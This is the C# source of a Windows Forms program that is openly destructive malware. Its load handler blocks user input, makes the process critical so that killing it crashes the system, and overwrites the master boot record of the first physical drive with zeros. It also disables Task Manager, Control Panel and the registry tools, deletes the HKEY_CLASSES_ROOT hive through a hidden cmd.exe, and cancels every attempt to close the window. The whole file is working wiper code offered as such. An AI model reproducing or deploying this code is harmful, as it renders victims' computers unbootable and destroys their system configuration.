using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.WindowsRuntime;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
namespace Overwrite_MBR
{
   public partial class Form1 : Form

    {
        //Dll using

        // for BlockInput
        [DllImport("user32.dll")]
              private static extern bool BlockInput(bool block);

           [DllImport("ntdll.dll", SetLastError = true)]
              private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
           [DllImport("kernel32")]
              private static extern IntPtr CreateFile(
              string lpFileName,
              uint dwDesiredAccess,
              uint dwShareMode,
              IntPtr lpSecurityAttributes,
              uint dwCreationDisposition,
              uint dwFlagsAndAttributes,
              IntPtr hTemplateFile);

           [DllImport("kernel32")]
              private static extern bool WriteFile(
              IntPtr hFile,
              byte[] lpBuffer,
              uint nNumberOfBytesToWrite,
              out uint lpNumberOfBytesWritten,
              IntPtr lpOverlapped);

           private const uint GenericRead = 0x80000000;
           private const uint GenericWrite = 0x40000000;
           private const uint GenericExecute = 0x20000000;
           private const uint GenericAll = 0x10000000;
           private const uint FileShareRead = 0x1;
           private const uint FileShareWrite = 0x2;
           private const uint OpenExisting = 0x3;
           private const uint FileFlagDeleteOnClose = 0x4000000;
           private const uint MbrSize = 512u;
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
              Music();//Run Music using batch File
              FreezeMouse();//BlockInput
              Fuckyou.Dock = DockStyle.Fill;//Full Screen
              this.WindowState = FormWindowState.Maximized;
              this.WindowState = FormWindowState.Maximized;
              this.TopMost = true;
              Cursor.Clip = Screen.PrimaryScreen.Bounds;                     
              int isCritical = 1;
              int BreakOnTermination = 0x1D;
              Process.EnterDebugMode();
              NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
              Form1 mbr_nostatic = new Form1();
              Thread MBR = new Thread(mbr_nostatic.MBR_destory);
              Form1 reg_dest = new Form1();//reg Destr
              MBR.Start();
              reg_dest.Destroy_Registry();
        }
        public void MBR_destory()// <-MBR Overwrite :(
        {
              var mbrData = new byte[MbrSize];// Creat array 
              var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,//Writing on the first Hard Disk 
              OpenExisting, 0, IntPtr.Zero);
                try
                {
                     WriteFile(mbr, mbrData, MbrSize, out uint lpNumberofBytesWritten, IntPtr.Zero);
                }
                 catch { }
        }
          public void Destroy_Registry()
         {
              //disable task manager
              RegistryKey DisableTaskMgr = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
              DisableTaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
              DisableTaskMgr.Close();
              //disable  ControlPanel + RegRegistry Editor
              RegistryKey RegKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
              RegKey.SetValue("NoControlPanel", true, RegistryValueKind.DWord); RegKey.Close();

              RegKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
              RegKey.SetValue("NoControlPanel", true, RegistryValueKind.DWord); RegKey.Close();
            
              RegKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System");
              RegKey.SetValue("DisableRegistryTools", true, RegistryValueKind.DWord); RegKey.Close();

              RegKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
              RegKey.SetValue("DisableRegistryTools", true, RegistryValueKind.DWord); RegKey.Close();

                  const string quote = "\"";
                  ProcessStartInfo ctrl = new ProcessStartInfo();
                  ctrl.FileName = "cmd.exe";
                  ctrl.WindowStyle = ProcessWindowStyle.Hidden;
                  ctrl.Arguments = @"/k regedit /s" + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
                  Process.Start(ctrl);

                  ProcessStartInfo Registry_Kill = new ProcessStartInfo();
                  Registry_Kill.FileName = "cmd.exe";
                  Registry_Kill.WindowStyle = ProcessWindowStyle.Hidden;
                  Registry_Kill.Arguments = @"/k reg delete HKCR /f";
                  Process.Start(Registry_Kill);
               }          
        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Prevent the user from closing the window
        }
        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.B)
            {
                BlockMouseCursor();
            }
        }
        private void Form1_MouseClick(object sender, MouseEventArgs e)
        {   
        }
        public void Music()
        {
            Process.Start("Music.bat");
        }
        private void BlockMouseCursor()//hide the mouse cursor
        {
            Cursor.Hide();
            Cursor.Clip = new Rectangle(Location, Size);
        }
        private void label1_Click(object sender, EventArgs e)
        {  
        }
        public static void FreezeMouse() //Freeze mouse
        {
            BlockInput(true);
        }
      /*  public void Restart_PC()
        {
            int restartDelayMinutes = 4;
            int restartDelayMilliseconds = restartDelayMinutes * 60 * 1000;
            Process.Start("ShutDown", "/r/ ");
            Thread.Sleep(restartDelayMilliseconds);
        }*/
    }
}
//AHMED Loves you :)

